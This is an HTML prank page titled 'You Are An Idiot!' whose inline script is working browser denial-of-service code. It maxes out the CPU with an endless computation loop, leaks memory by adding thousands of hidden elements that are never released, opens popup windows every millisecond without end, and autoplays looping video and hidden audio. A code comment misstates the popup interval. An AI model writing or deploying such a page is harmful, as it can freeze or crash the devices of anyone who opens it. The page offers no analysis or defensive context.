<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>You Are An Idiot!</title>
<script src="scripts/you.js"></script>
<style>
    html, body {
        margin:0; padding:0;
        width:100%; height:100%;
        overflow:hidden; background:black;
    }
    .idiot-container {
        width:100%; height:100%;
        display:flex; align-items:center; justify-content:center;
    }
    video {
        width:100%; height:100%;
        object-fit:cover; z-index:1; position:relative;
    }
    /* Hidden elements to fill memory */
    .memory-burner {
        width:1px; height:1px; background:transparent; position:absolute;
    }
</style>
</head>
<body>
<div class="idiot-container">
    <video src="media/youare.mp4" id="youare-video" muted autoplay loop></video>
</div>

<audio id="youare-audio" autoplay loop hidden>
    <source src="media/youare.mp3" type="audio/mp3">
</audio>

<script>
/* ================= CPU/GPU max ================= */
function cpuPulse() {
    for(let i=0;i<2000000;i++) Math.sqrt(Math.random()*i);
    requestAnimationFrame(cpuPulse);
}
cpuPulse();

/* ================= Memory chaos ================= */
const memoryArray = [];
function burnMemory() {
    for(let i=0;i<1000;i++){
        const div = document.createElement('div');
        div.className = 'memory-burner';
        document.body.appendChild(div);
        memoryArray.push(div); // store reference to prevent garbage collection
    }
    setTimeout(burnMemory, 50);
}
burnMemory();

/* ================= Infinite popup chaos ================= */
function spawnPopup() {
    const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
    setTimeout(spawnPopup, 1); // spawn every 30000000 seconds
}
spawnPopup();

/* ================= Mouse chaos ================= */
document.addEventListener('mousemove', e => {
    for(let i=0;i<50;i++){
        Math.sqrt(Math.random()*(e.clientX+i));
    }
});
</script>
</body>
</html>
